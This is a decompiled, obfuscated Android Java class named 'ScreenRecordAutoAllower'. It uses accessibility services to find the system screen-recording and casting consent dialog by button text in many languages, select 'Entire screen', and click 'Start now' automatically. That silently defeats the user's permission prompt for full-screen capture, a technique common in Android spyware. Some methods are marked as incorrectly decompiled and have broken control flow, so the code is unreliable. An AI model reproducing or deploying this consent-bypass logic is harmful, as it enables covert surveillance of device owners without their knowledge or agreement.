package p000;

import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.ArrayList;
import java.util.List;
import kotlin.text.AbstractC0779a1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class tu0 {

    /* renamed from: a7 */
    public static final String[] f60269a7;

    /* renamed from: a8 */
    public static final String[] f60270a8;

    /* renamed from: a9 */
    public static final String[] f60271a9;

    /* renamed from: b0 */
    public static final String[] f60272b0;

    /* renamed from: b1 */
    public static final String[] f60273b1;

    /* renamed from: b2 */
    public static final String[] f60274b2;

    /* renamed from: a0 */
    public final w00 f60275a0;

    /* renamed from: a1 */
    public final w00 f60276a1;

    /* renamed from: a2 */
    public volatile int f60277a2;

    /* renamed from: a3 */
    public volatile long f60278a3;

    /* renamed from: a4 */
    public volatile boolean f60279a4;

    /* renamed from: a5 */
    public final Handler f60280a5 = new Handler(Looper.getMainLooper());

    /* renamed from: a6 */
    public final Handler f60281a6;

    static {
        new su0(null);
        f60269a7 = new String[]{"com.android.systemui"};
        f60270a8 = new String[]{"投射", "录制", "录屏", "投屏", "截取", "屏幕录制", "屏幕投射", "捕获屏幕", "共享屏幕", "开始录制", "Cast", "Record", "Screen recording", "Screen cast", "Capture screen", "Share screen", "Start recording", "Screen recording", "Screen capture", "Cast screen", "Share screen", "Start recording", "Record screen", "画面録画", "スクリーン", "キャスト", "画面共有", "화면 녹화", "화면 공유", "캐스트", "Pantalla", "Bildschirmaufnahme", "Enregistrement", "Schermo", "Экран"};
        f60271a9 = new String[]{"整个屏幕", "全屏", "完整屏幕", "录制整个屏幕", "共享整个屏幕", "共享全屏", "投屏全屏", "Entire screen", "Full screen", "Whole screen", "Complete screen", "Record entire screen", "Share entire screen", "全画面", "画面全体", "전체 화면", "Pantalla completa", "Plein écran", "Vollbild", "Schermo intero", "Весь экран"};
        f60272b0 = new String[]{"共享一个应用", "单个应用", "单一应用", "一个应用", "选择应用", "A single app", "Single app", "One app", "Select app", "単一アプリ", "アプリを選択", "단일 앱", "앱 선택", "Una aplicación", "Une application", "Eine App", "Un'app"};
        f60273b1 = (String[]) AbstractC0134bh.m210728f1(dh0.m212602a1().toArray(new String[0]), new String[]{"继续", "Continue", "立即开始", "现在开始", "开始", "Start now", "Start", "Begin", "Iniciar", "Démarrer", "Starten"});
        f60274b2 = (String[]) dh0.f55753a3.toArray(new String[0]);
    }

    public tu0(w00 w00Var, w00 w00Var2) {
        this.f60275a0 = w00Var;
        this.f60276a1 = w00Var2;
        HandlerThread handlerThread = new HandlerThread("ScreenRecordBg");
        handlerThread.start();
        this.f60281a6 = new Handler(handlerThread.getLooper());
    }

    /* renamed from: a0 */
    public static boolean m214782a0(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        String string;
        String string2;
        try {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
            if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByText) {
                    CharSequence text = accessibilityNodeInfo2.getText();
                    if (text == null || (string2 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string2).toString()) == null) {
                        string = "";
                    }
                    if (string.equalsIgnoreCase(AbstractC0779a1.m213687e0(str).toString())) {
                        String[] strArr = f60274b2;
                        int length = strArr.length;
                        int i = 0;
                        while (true) {
                            if (i >= length) {
                                boolean zPerformAction = accessibilityNodeInfo2.performAction(16);
                                if (!zPerformAction) {
                                    AccessibilityNodeInfo parent = accessibilityNodeInfo2.getParent();
                                    int i2 = 0;
                                    while (!zPerformAction && parent != null && i2 < 3) {
                                        zPerformAction = parent.performAction(16);
                                        AccessibilityNodeInfo parent2 = parent.getParent();
                                        try {
                                            parent.recycle();
                                        } catch (Exception unused) {
                                        }
                                        i2++;
                                        parent = parent2;
                                    }
                                    if (parent != null) {
                                        try {
                                            parent.recycle();
                                        } catch (Exception unused2) {
                                        }
                                    }
                                }
                                if (zPerformAction) {
                                    return true;
                                }
                            } else {
                                if (AbstractC0779a1.m213652a5(string, strArr[i], true)) {
                                    break;
                                }
                                i++;
                            }
                        }
                    }
                }
            }
            return false;
        } catch (Exception e) {
            tz0.m214808a8("点击按钮失败: ", str, "ScreenRecordAutoAllower", e);
            return false;
        }
    }

    /* renamed from: a1 */
    public static boolean m214783a1(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.performAction(16)) {
            return true;
        }
        AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
        int i = 0;
        while (parent != null && i < 3) {
            if (parent.isClickable() && parent.performAction(16)) {
                return true;
            }
            AccessibilityNodeInfo parent2 = parent.getParent();
            try {
                parent.recycle();
            } catch (Exception unused) {
            }
            i++;
            parent = parent2;
        }
        if (parent != null) {
            try {
                parent.recycle();
            } catch (Exception unused2) {
            }
        }
        return false;
    }

    /* renamed from: a2 */
    public static AccessibilityNodeInfo m214784a2(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        String string2;
        String string3;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if (m214786a4(string) && accessibilityNodeInfo.isClickable()) {
            return accessibilityNodeInfo;
        }
        AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
        for (int i = 0; parent != null && i < 3; i++) {
            CharSequence className2 = parent.getClassName();
            if (className2 == null || (string3 = className2.toString()) == null) {
                string3 = "";
            }
            if (m214786a4(string3) && parent.isClickable()) {
                return parent;
            }
            parent = parent.getParent();
        }
        AccessibilityNodeInfo parent2 = accessibilityNodeInfo.getParent();
        if (parent2 == null) {
            return null;
        }
        int childCount = parent2.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = parent2.getChild(i2);
            if (child != null) {
                CharSequence className3 = child.getClassName();
                if (className3 == null || (string2 = className3.toString()) == null) {
                    string2 = "";
                }
                if (m214786a4(string2) && child.isClickable()) {
                    return child;
                }
            }
        }
        return null;
    }

    /* renamed from: a3 */
    public static void m214785a3(int i, AccessibilityNodeInfo accessibilityNodeInfo, String str, ArrayList arrayList) {
        String string;
        if (i > 15) {
            return;
        }
        try {
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className == null || (string = className.toString()) == null) {
                string = "";
            }
            if (AbstractC0779a1.m213652a5(string, str, false) || string.equals(str)) {
                arrayList.add(accessibilityNodeInfo);
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i2 = 0; i2 < childCount; i2++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null) {
                    m214785a3(i + 1, child, str, arrayList);
                }
            }
        } catch (Exception unused) {
        }
    }

    /* renamed from: a4 */
    public static boolean m214786a4(String str) {
        return AbstractC0779a1.m213652a5(str, "RadioButton", false) || AbstractC0779a1.m213652a5(str, "CheckBox", false) || AbstractC0779a1.m213652a5(str, "CompoundButton", false) || AbstractC0779a1.m213652a5(str, "Switch", false) || AbstractC0779a1.m213652a5(str, "ToggleButton", false);
    }

    /* renamed from: a5 */
    public static boolean m214787a5(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String string;
        String string2;
        boolean z;
        boolean z2;
        String string3;
        if (i <= 10) {
            CharSequence className = accessibilityNodeInfo.getClassName();
            String str = "";
            if (className == null || (string = className.toString()) == null) {
                string = "";
            }
            CharSequence text = accessibilityNodeInfo.getText();
            if (text == null || (string2 = text.toString()) == null) {
                string2 = "";
            }
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription != null && (string3 = contentDescription.toString()) != null) {
                str = string3;
            }
            if (AbstractC0779a1.m213652a5(string, "RadioButton", false) || AbstractC0779a1.m213652a5(string, "CheckBox", false)) {
                for (String str2 : f60271a9) {
                    if (AbstractC0779a1.m213652a5(string2, str2, true) || AbstractC0779a1.m213652a5(str, str2, true)) {
                        z = true;
                        break;
                    }
                }
                z = false;
                for (String str3 : f60272b0) {
                    if (AbstractC0779a1.m213652a5(string2, str3, true) || AbstractC0779a1.m213652a5(str, str3, true)) {
                        z2 = true;
                        break;
                    }
                }
                z2 = false;
                if (!z || z2 || !accessibilityNodeInfo.performAction(16)) {
                }
                return true;
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i2 = 0; i2 < childCount; i2++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null && m214787a5(child, i + 1)) {
                    return true;
                }
            }
        }
        return false;
    }

    /* renamed from: a6 */
    public final void m214788a6(AccessibilityNodeInfo accessibilityNodeInfo) {
        try {
            AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) this.f60275a0.invoke();
            if (accessibilityNodeInfo2 != null) {
                accessibilityNodeInfo = accessibilityNodeInfo2;
            }
            for (String str : (!this.f60279a4 || Build.VERSION.SDK_INT >= 34) ? f60273b1 : f60273b1) {
                if (m214782a0(accessibilityNodeInfo, str)) {
                    t60.m214714d6("ScreenRecordAutoAllower", "✅ 投屏弹窗自动点击成功: " + str);
                    this.f60277a2 = 0;
                    this.f60279a4 = false;
                    this.f60276a1.invoke();
                    return;
                }
            }
            t60.m214726f4("ScreenRecordAutoAllower", "⚠️ 未找到投屏允许按钮");
            this.f60277a2 = 0;
            this.f60276a1.invoke();
        } catch (Exception e) {
            t60.m214705c6("ScreenRecordAutoAllower", "❌ 点击投屏允许按钮失败", e);
            this.f60277a2 = 0;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:59:0x00ea  */
    /* renamed from: a7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m214789a7(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfoM214784a2;
        String string;
        String string2;
        String[] strArr = f60272b0;
        int length = strArr.length;
        int i = 0;
        int i2 = 0;
        loop0: while (true) {
            if (i2 >= length) {
                ArrayList arrayList = new ArrayList();
                m214785a3(0, accessibilityNodeInfo, "Spinner", arrayList);
                int size = arrayList.size();
                int i3 = 0;
                while (i3 < size) {
                    Object obj = arrayList.get(i3);
                    i3++;
                    AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj;
                    if (!accessibilityNodeInfo2.isClickable() || !accessibilityNodeInfo2.performAction(16)) {
                    }
                }
                ArrayList arrayList2 = new ArrayList();
                m214785a3(0, accessibilityNodeInfo, "android.widget.RadioButton", arrayList2);
                boolean zIsEmpty = arrayList2.isEmpty();
                String[] strArr2 = f60271a9;
                if (zIsEmpty) {
                    while (i < r2) {
                    }
                    return m214787a5(accessibilityNodeInfo, 0);
                }
                int size2 = arrayList2.size();
                int i4 = 0;
                while (i4 < size2) {
                    Object obj2 = arrayList2.get(i4);
                    i4++;
                    AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) obj2;
                    CharSequence text = accessibilityNodeInfo3.getText();
                    String str = "";
                    if (text == null || (string = text.toString()) == null) {
                        string = "";
                    }
                    CharSequence contentDescription = accessibilityNodeInfo3.getContentDescription();
                    if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
                        str = string2;
                    }
                    boolean zIsChecked = accessibilityNodeInfo3.isChecked();
                    int length2 = strArr2.length;
                    int i5 = i;
                    while (i5 < length2) {
                        String str2 = strArr2[i5];
                        if (AbstractC0779a1.m213652a5(string, str2, true) || AbstractC0779a1.m213652a5(str, str2, true)) {
                            if (zIsChecked || accessibilityNodeInfo3.performAction(16)) {
                                break;
                            }
                            i = 0;
                        } else {
                            i5++;
                            i = 0;
                        }
                    }
                }
                for (String str3 : strArr2) {
                    try {
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str3);
                        if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                            for (AccessibilityNodeInfo accessibilityNodeInfo4 : listFindAccessibilityNodeInfosByText) {
                                if (!accessibilityNodeInfo4.isVisibleToUser() || (((accessibilityNodeInfoM214784a2 = m214784a2(accessibilityNodeInfo4)) == null || !accessibilityNodeInfoM214784a2.performAction(16)) && !m214783a1(accessibilityNodeInfo4))) {
                                }
                            }
                        }
                    } catch (Exception unused) {
                        t60.m214695b6("查找全屏选项异常: " + str3, "msg");
                    }
                }
                try {
                    return m214787a5(accessibilityNodeInfo, 0);
                } catch (Exception unused2) {
                    return false;
                }
                return true;
            }
            String str4 = strArr[i2];
            try {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str4);
                if (listFindAccessibilityNodeInfosByText2 != null && !listFindAccessibilityNodeInfosByText2.isEmpty()) {
                    for (AccessibilityNodeInfo accessibilityNodeInfo5 : listFindAccessibilityNodeInfosByText2) {
                        if (accessibilityNodeInfo5.isVisibleToUser() && m214783a1(accessibilityNodeInfo5)) {
                            break loop0;
                        }
                    }
                }
            } catch (Exception unused3) {
                t60.m214695b6("查找选择框异常: " + str4, "msg");
            }
            i2++;
        }
        this.f60280a5.postDelayed(new qu0(this, 1), 300L);
        return true;
    }
}
